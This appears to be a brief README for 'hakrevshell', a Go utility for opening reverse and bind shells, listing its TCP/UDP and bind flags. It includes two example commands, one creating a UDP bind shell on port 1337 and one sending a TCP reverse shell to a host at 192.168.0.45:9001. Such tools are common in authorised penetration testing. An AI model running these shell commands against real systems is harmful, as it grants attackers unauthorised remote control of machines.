# hakrevshell
A golang reverse shell utility

## Usage

- `-h`: Host and port to connect to
- `--udp`: Use UDP instead of the default TCP
- `--bind`: Create a bind shell instead of the default reverse shell

## Example Usage

Create a UDP bind shell on port 1337

```
hakrevshell -h 192.168.0.44:1337 --udp --bind
```

Create a TCP reverse shell to port 9001 on external host (192.168.0.45)

```
hakrevshell -h 192.168.0.45:9001
```
